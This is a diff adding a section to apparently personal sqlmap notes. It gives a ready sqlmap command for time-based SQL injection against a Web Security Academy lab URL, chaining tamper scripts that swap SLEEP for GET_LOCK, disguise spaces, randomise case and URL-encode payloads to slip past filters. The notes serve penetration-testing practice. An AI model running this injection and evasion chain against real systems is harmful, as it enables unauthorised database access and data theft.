@@ -69,3 +69,21 @@ SQLMAP Tamper Scripts
 * versionedkeywords - Encloses each non-function keyword with (MySQL) versioned comment
 * versionedmorekeywords - Encloses each keyword with (MySQL) versioned comment
 * xforwardedfor - Append a fake HTTP header 'X-Forwarded-For' (and alike)
+
+<h1>Interesting Tamper Scripts</h1>
+
+<h2>Time-Based Tampers</h2>
+<h3><mark>--tamper=sleep2getlock,space2dash,randomcase,charencode</mark></h3>
+
+sqlmap -u 'https://0a0e00e00384b00d8019766c000600fd.web-security-academy.net/filter?category=Gifts' -p category --tamper=randomcase,sleep2getlock,space2dash,charencode --technique=T
+
+1. Replace SLEEP with GET_LOCK
+2. Replace spaces ' ' with '--abcd%0A'
+3. Random Character Case on SQL Keywords
+4. URL Encode all Characters
+
+SEE IMAGE BELOW TO SEE WHAT THIS TAMPER LOOKS LIKE IN BURPSUITE
+
+
+
+<img width="1904" height="330" alt="tamper-script-timebased-sleep2lock-and-space2dash" src="https://github.com/user-attachments/assets/5d9b2930-7680-4268-8f2e-43f85250fb2a" />
